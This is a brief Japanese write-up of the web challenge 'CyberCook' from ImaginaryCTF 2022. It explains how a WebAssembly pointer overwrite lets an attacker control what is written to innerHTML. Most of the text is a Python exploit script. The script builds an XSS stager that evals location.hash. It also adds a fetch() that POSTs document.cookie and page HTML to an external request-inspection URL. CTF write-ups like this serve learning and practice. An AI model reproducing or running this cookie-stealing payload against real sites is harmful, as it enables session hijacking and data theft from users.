---
layout: chall
ctf_name: imaginaryctf_2022
problem_name: CyberCook
genre: web
solved_date: 2022-07-18
during_ctf: true
tag: [wasm,xss]
fav: false
difficulty: normal
---

### 概要



### 解法

実験をしていると、変換する文字の長さが 60 字以上のときに戻り値のポインタを base64 でエンコードした後の値によって書き換えることができることが分かった。これを用いて、hex を変換した後のバッファの位置にポインタを
向け、`innerHtml` に書き込まれる値を制御することができた。
<details><summary>スクリプト</summary>

```py
import base64

import requests

stager = "<img src=e onerror=eval(location.hash.slice(1))>"
stager += " " * (6 - len(stager.encode()) % 6)

assert len(stager) % 6 == 0

payload = stager.encode()
payload += base64.b64decode((0x00503670).to_bytes(8, "little").replace(b'\x00', b'/'))[:6] * 8

url = 'http://localhost:8080/?action=base64&input='
script = "fetch('https://requestinspector.com/inspect/01g85s4t9q77sty57kf0fyhksy',{method:'POST',body:document.cookie+'\\n'+document.head.innerHTML});"

print(f'[+] {len(payload)=}')
print(url + payload.hex() + "#" + script)
```

</details>

